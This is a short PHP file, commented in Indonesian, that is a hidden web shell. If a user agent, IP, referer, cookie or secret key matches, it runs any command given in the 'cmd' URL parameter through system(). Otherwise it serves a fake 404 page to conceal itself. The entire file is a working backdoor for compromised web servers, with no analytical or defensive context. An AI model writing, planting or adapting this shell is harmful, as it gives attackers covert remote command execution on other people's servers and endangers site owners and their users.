<?php
// ================================================================
// HIDDEN PLUS – Multi-condition Access (FIXED)
// ================================================================

// Konfigurasi akses
$config = [
    'allowed_ua' => [
        'vulnAttack', 
        'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.1; Trident/6.0; IEMobile/11.0)'
    ],
    'allowed_ip' => ['127.0.0.1', '::1', '192.168.1.100'],
    'allowed_referer' => ['http://localhost', 'https://localhost', 'https://target.com'],
    'secret_key' => 'your_secret_key'
];

$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$ref = $_SERVER['HTTP_REFERER'] ?? '';

$access = false;

// Cek berbagai kondisi
if (in_array($ua, $config['allowed_ua'])) $access = true;
if (in_array($ip, $config['allowed_ip'])) $access = true;
if (in_array($ref, $config['allowed_referer'])) $access = true;
if (isset($_COOKIE['access']) && $_COOKIE['access'] === 'granted') $access = true;
if (isset($_GET['key']) && $_GET['key'] === $config['secret_key']) $access = true;

// Eksekusi jika akses diizinkan
if ($access && isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    // Sembunyikan dengan 404
    header('HTTP/1.0 404 Not Found');
    echo '<h1>404 Not Found</h1>';
}
?>